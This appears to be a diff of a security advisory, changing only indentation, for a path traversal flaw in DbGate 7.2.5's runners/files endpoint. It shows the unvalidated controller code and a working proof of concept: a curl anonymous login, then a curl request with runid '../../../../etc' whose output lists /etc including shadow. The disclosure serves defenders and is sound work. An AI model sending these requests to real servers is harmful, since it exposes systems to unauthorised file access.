@@ -22,9 +22,9 @@ In `packages/api/src/controllers/runners.js`:
 ```javascript
 files_meta: true,
 async files({ runid }) {
-    const directory = path.join(rundir(), runid);  // runid not validated!
-    const files = await fs.readdir(directory);
-    // ... returns file names, sizes, and absolute paths
+ const directory = path.join(rundir(), runid); // runid not validated!
+ const files = await fs.readdir(directory);
+ // ... returns file names, sizes, and absolute paths
 }
 ```
 
@@ -38,33 +38,33 @@ Verified on DbGate 7.2.5 Docker (default anonymous deployment, port 3000):
 
 ```bash
 curl -s -X POST http://TARGET:3000/auth/login \
-  -H "Content-Type: application/json" \
-  -d '{"amoid":"none"}'
+ -H "Content-Type: application/json" \
+ -d '{"amoid":"none"}'
 ```
 
 **Step 2: List `/etc` directory via path traversal**
 
 ```bash
 curl -s -X POST http://TARGET:3000/runners/files \
-  -H "Authorization: Bearer <JWT>" \
-  -H "Content-Type: application/json" \
-  -d '{"runid":"../../../../etc"}'
+ -H "Authorization: Bearer <JWT>" \
+ -H "Content-Type: application/json" \
+ -d '{"runid":"../../../../etc"}'
 ```
 ```
 [
-  {"name":".pwd.lock","size":0,"path":"/etc/.pwd.lock"},
-  {"name":"ODBCDataSources","size":4096,"path":"/etc/ODBCDataSources"},
-  {"name":"adduser.conf","size":3040,"path":"/etc/adduser.conf"},
-  {"name":"alternatives","size":4096,"path":"/etc/alternatives"},
-  {"name":"apt","size":4096,"path":"/etc/apt"},
-  {"name":"bash.bashrc","size":1994,"path":"/etc/bash.bashrc"},
-  {"name":"bindresvport.blacklist","size":367,"path":"/etc/bindresvport.blacklist"},
-  {"name":"ca-certificates","size":4096,"path":"/etc/ca-certificates"},
-  {"name":"ca-certificates.conf","size":6422,"path":"/etc/ca-certificates.conf"},
-  {"name":"cron.d","size":4096,"path":"/etc/cron.d"},
-  {"name":"cron.daily","size":4096,"path":"/etc/cron.daily"},
-  {"name":"shadow","size":500,"path":"/etc/shadow"},
-  ...
+ {"name":".pwd.lock","size":0,"path":"/etc/.pwd.lock"},
+ {"name":"ODBCDataSources","size":4096,"path":"/etc/ODBCDataSources"},
+ {"name":"adduser.conf","size":3040,"path":"/etc/adduser.conf"},
+ {"name":"alternatives","size":4096,"path":"/etc/alternatives"},
+ {"name":"apt","size":4096,"path":"/etc/apt"},
+ {"name":"bash.bashrc","size":1994,"path":"/etc/bash.bashrc"},
+ {"name":"bindresvport.blacklist","size":367,"path":"/etc/bindresvport.blacklist"},
+ {"name":"ca-certificates","size":4096,"path":"/etc/ca-certificates"},
+ {"name":"ca-certificates.conf","size":6422,"path":"/etc/ca-certificates.conf"},
+ {"name":"cron.d","size":4096,"path":"/etc/cron.d"},
+ {"name":"cron.daily","size":4096,"path":"/etc/cron.daily"},
+ {"name":"shadow","size":500,"path":"/etc/shadow"},
+ ...
 ]
 ```
 
